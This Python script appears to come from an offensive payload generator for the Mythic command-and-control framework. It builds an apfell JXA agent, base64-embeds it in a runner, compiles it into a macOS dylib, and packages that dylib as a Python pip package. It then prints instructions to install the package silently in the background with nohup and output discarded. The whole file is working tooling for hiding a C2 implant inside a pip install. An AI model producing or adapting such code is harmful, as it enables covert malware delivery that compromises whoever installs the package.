import os, base64
import asyncio
from .Utilities import *

def pip_package_dylib():
    temp = "./Templates/Python_PIP_Package_Dylib/"
    payload = "./Payloads/Python_PIP_Package_Payload_Dylib/"

    copyanything(temp,payload)
    copyanything("./Templates/JXADylib_Runner/JXADylib_Runner/","./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/")

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Python PIP Package W/Dylib",
                                           filename="Python_PIP_Package_Dylib.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            # Replace template values
            modifyFile = payload + "/Pip_Files/setup.py"
            #  Build the payload
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/Python_PIP_Package_Dylib.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)  # write out to disk

            #Modify the runner
            templateString = "BASE64 ENCODED APFELL PAYLOAD HERE"
            fin = open(payload + "Python_PIP_Package_Dylib.js", "rt")
            orgPayload = fin.read()
            fin.close()

            #base64 Payload
            message_bytes = orgPayload.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')


            fin = open("./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/JSRunner.mm", "rt")
            data = fin.read()
            data = data.replace(templateString, base64_message)
            fin.close()

            fin = open("./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/JSRunner.mm", "wt")
            fin.write(data)
            fin.close()

            os.system("g++ -dynamiclib -o /private/tmp/pipsetup.dylib -framework Foundation -framework OSAKit ./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/plugin.cpp ./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/jsrunner.mm")
            os.system("mv /private/tmp/pipsetup.dylib ./Payloads/Python_PIP_Package_Payload_Dylib/Pip_Files/pipsetup.dylib")
            #os.system("rm ./Payloads/Python_PIP_Package_Payload_Dylib/Python_PIP_Package_Dylib.js")

            print("[*] Building Python PIP Package")
            os.system("chmod +x " + modifyFile)
            print("[*] Done! Execute using Python 'nohup pip install . > /dev/null 2>&1&' within 'Pip_Files' folder")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
